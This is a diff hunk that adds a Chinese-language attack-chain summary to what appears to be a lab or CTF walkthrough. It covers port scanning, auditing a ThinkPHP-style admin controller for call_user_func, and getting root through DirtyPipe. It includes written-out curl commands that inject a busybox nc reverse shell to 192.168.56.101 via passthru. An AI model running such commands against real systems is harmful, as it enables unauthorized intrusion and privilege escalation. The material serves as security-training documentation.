@@ -592,3 +592,9 @@ uid=0(root) gid=0(root) groups=0(root)
 # 
 ```
 
+## 攻击链总结
+
+* 端口扫描 : 发现`22 / ssh`、`8080 / http` , 指纹识别：发现`GitHub`上存在8080端口对应网站的源码。
+* 代码审计： `app/admin/controller/Admin.php` 存在 危险函数 `call_user_func`，要访问到这一步需要经过`check、check1`中间件，`check` 对 `url`进行了黑名单处理，`check1`检测是否由对应的身份，如果身份检验通过，就可以访问危险函数。
+* 漏洞利用：`curl -i -c cookie.txt -b cookie.txt http://192.168.56.107:8080/index/token/token`获取`sb`，`curl -i -b cookie.txt http://192.168.56.107/think/admin/hello?a=busybox%20nc%20192.168.56.101%2039666%20-e%20/bin/bash&b=passthru`，反向shell，并进行优化。
+* 权限提升：查看内核版本，发现其内核版本在`DirtyPipe`的影响范围之内，通过`DirtyPipe的payload`进行提权，然后`su`登陆`root`即可提权成功。
